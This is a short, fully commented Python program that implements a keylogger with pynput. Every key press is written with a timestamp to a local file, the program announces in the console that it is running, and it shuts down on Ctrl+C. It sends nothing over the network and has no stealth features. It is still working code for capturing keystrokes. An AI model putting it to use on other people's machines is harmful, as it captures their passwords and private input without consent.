# Import required libraries
from pynput import keyboard      # For detecting keyboard presses
import threading                 # For running tasks in parallel
import signal                    # For handling program shutdown signals
from datetime import datetime    # For adding timestamps

class KeyLogger:

    
    def __init__(self, filename="keyfile.txt"): # Initialize the keylogger
       
        self.filename = filename  # File to save logged keys
        self.running = True       # Flag to indicate if the keylogger is running
        self.stop_event = threading.Event()  # Event to safely stop the keylogger
        
    def timestamp(self):
    
        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    def key_pressed(self, key): 
     
        try:
            # Open the log file in append mode
            with open(self.filename, 'a') as log_file:
                timestamp = self.timestamp()  # Get the current timestamp
                
                # Check if the key has a 'char' attribute (normal keys)
                # Check if the key is a printable character (has 'char' attribute)
                if hasattr(key, 'char'):
                    log_file.write(f'[{timestamp}] Char: {key.char} \n ')  # Log normal keys
                else:
                    log_file.write(f'[{timestamp}] Special Key: {str(key)}\n')  # Log special keys
                    
        except Exception as e:
            # Print an error message if logging fails
            print(f"Error while logging key: {str(e)}")
            
        # Continue running unless the stop event is set
        return not self.stop_event.is_set()

    def signal_handler(self, signum, frame): # Handles termination signals (e.g., Ctrl+C) to stop the keylogger safely.
       
        print("\nTermination signal received. Stopping the keylogger...")
        self.stop()

    def stop(self):
        """
        Stops the keylogger by setting the stop event and updating the running flag.
        """
        self.stop_event.set()  # Set the stop event
        self.running = False   # Update the running flag
        
    def start(self):
        """
        Starts the keylogger and listens for key press events.
        """
        # Set up signal handlers for safe termination
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Start the keyboard listener
        with keyboard.Listener(on_press=self.key_pressed) as listener:
            print(f"Keylogger is running. Logging keys to '{self.filename}'.")
            print("Press Ctrl+C to stop.")
            
            # Main loop to keep the program running
            while self.running and not self.stop_event.is_set():
                self.stop_event.wait(timeout=1.0)  # Check for stop event every second
                
            # Stop the keyboard listener when done
            listener.stop()
            
        print("\nKeylogger has stopped.")

# Entry point of the program
if __name__ == "__main__":
    logger = KeyLogger()  # Create a KeyLogger instance
    logger.start()        # Start the keylogger
